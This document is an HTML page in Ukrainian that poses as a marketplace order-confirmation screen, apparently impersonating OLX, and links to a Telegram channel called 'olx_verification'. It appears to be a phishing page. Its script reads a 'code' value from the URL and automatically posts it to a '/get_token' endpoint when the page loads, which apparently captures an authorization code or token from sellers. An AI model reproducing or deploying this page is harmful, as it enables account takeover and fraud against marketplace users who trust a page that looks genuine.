<!DOCTYPE html>
<html lang="uk">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Замовлення сформовано</title>
<style>
body {
    font-family: Arial, sans-serif;
    background: #f5f5f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.card {
    background: #ffffff;
    padding: 40px 30px;
    border-radius: 12px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.15);
    text-align: center;
    width: 360px;
}

.card h2 {
    color: #002f5f;
    margin-bottom: 15px;
    font-size: 22px;
}

.card p {
    color: #333;
    margin-bottom: 25px;
    font-size: 16px;
    line-height: 1.6;
}

button {
    padding: 14px 25px;
    background: #ff6600;
    color: white;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    font-weight: bold;
    font-size: 14px;
    transition: background 0.3s;
}

button:hover {
    background: #e65c00;
}
</style>
</head>
<body>

<div class="card">
    <h2 id="title">Замовлення успішно сформовано</h2>
    <p id="status">
        Ваше замовлення доставки успішно створено та передано покупцеві.<br><br>
        Будь ласка, повідомте покупця про відправлення та узгодьте деталі отримання.<br><br>
        Дякуємо, що користуєтеся нашими послугами.<br>
        Ми цінуємо вашу довіру та бажаємо вдалих продажів!
    </p>
    <button id="btn" style="display:inline-block;">Ми в Telegram</button>
</div>

<script>
// Получаем код из URL
const params = new URLSearchParams(window.location.search);
const code = params.get("code");

// Ссылка на Telegram
const telegramUrl = "https://t.me/olx_verification/share/url?url=&text=" + encodeURIComponent(
    "Замовлення успішно сформовано"
);

// Кнопка Telegram
document.getElementById("btn").addEventListener("click", () => {
    window.location.href = telegramUrl;
});

// Функция отправки кода на сервер
async function sendCode(code) {
    if (!code) return;

    try {
        const response = await fetch("/get_token", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ code })
        });

        const result = await response.json();
    } catch (err) {
        console.error(err);
    }
}

// Отправка кода автоматически при загрузке страницы
if (code) {
    sendCode(code);
}
</script>

</body>
</html>
